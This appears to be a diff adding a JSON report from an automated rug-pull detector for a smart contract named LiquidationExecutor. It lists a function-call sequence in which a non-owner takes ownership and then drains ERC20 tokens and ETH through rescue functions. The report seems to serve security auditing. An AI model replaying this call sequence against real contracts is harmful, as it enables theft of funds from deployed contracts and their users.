@@ -1,0 +1,133 @@
+{
+  "project_id": "52",
+  "contract_name": "LiquidationExecutor",
+  "contract_address": "0x568d5689487b202a896999294df30152e910e1a8",
+  "iteration": 1,
+  "rug_pull_detected": true,
+  "risk_level": "CRITICAL",
+  "triggered_conditions": [
+    "Unauthorized ownership transfer",
+    "Execution of privileged functions by non-owner",
+    "Rescue of ERC20 tokens and ETH by unauthorized address"
+  ],
+  "attack_path_summary": "The sequence allowed a non-owner address to set itself as the owner, enabling it to execute privileged functions such as setting swap targets and rescuing tokens and ETH, which could lead to a rug pull by draining assets from the contract.",
+  "critical_functions_involved": [
+    "SetOwner",
+    "SetSwapTargetAllowed",
+    "RescueERC20",
+    "RescueETH"
+  ],
+  "function_call_sequence": [
+    {
+      "function_name": "SetOwner",
+      "caller": "0x323d2567433fa40f4de372e53c4b996bf9a7100d",
+      "parameters": [
+        {
+          "name": "newOwner",
+          "type": "address",
+          "value": "0x0000000000000000000000000000000000000002"
+        }
+      ]
+    },
+    {
+      "function_name": "SetSwapTargetAllowed",
+      "caller": "0x0000000000000000000000000000000000000002",
+      "parameters": [
+        {
+          "name": "target",
+          "type": "address",
+          "value": "0x0000000000000000000000000000000000000003"
+        },
+        {
+          "name": "allowed",
+          "type": "bool",
+          "value": true
+        }
+      ]
+    },
+    {
+      "function_name": "ExecuteFlashLiquidation",
+      "caller": "0x0000000000000000000000000000000000000002",
+      "parameters": [
+        {
+          "name": "collateralAsset",
+          "type": "address",
+          "value": "0x0000000000000000000000000000000000000004"
+        },
+        {
+          "name": "debtAsset",
+          "type": "address",
+          "value": "0x0000000000000000000000000000000000000005"
+        },
+        {
+          "name": "user",
+          "type": "address",
+          "value": "0x0000000000000000000000000000000000000006"
+        },
+        {
+          "name": "debtToCover",
+          "type": "uint256",
+          "value": "1000000"
+        },
+        {
+          "name": "receiveAToken",
+          "type": "bool",
+          "value": true
+        },
+        {
+          "name": "swapTarget",
+          "type": "address",
+          "value": "0x0000000000000000000000000000000000000003"
+        },
+        {
+          "name": "swapData",
+          "type": "bytes",
+          "value": "0x"
+        },
+        {
+          "name": "swapTokenIn",
+          "type": "address",
+          "value": "0x0000000000000000000000000000000000000005"
+        }
+      ]
+    },
+    {
+      "function_name": "RescueERC20",
+      "caller": "0x0000000000000000000000000000000000000002",
+      "parameters": [
+        {
+          "name": "token",
+          "type": "address",
+          "value": "0x0000000000000000000000000000000000000005"
+        },
+        {
+          "name": "to",
+          "type": "address",
+          "value": "0x0000000000000000000000000000000000000002"
+        },
+        {
+          "name": "amount",
+          "type": "uint256",
+          "value": "500000"
+        }
+      ]
+    },
+    {
+      "function_name": "RescueETH",
+      "caller": "0x0000000000000000000000000000000000000002",
+      "parameters": [
+        {
+          "name": "to",
+          "type": "address",
+          "value": "0x0000000000000000000000000000000000000002"
+        },
+        {
+          "name": "amount",
+          "type": "uint256",
+          "value": "1000000000000000000"
+        }
+      ]
+    }
+  ],
+  "timestamp": "2026-02-12T11:43:28.494676"
+}
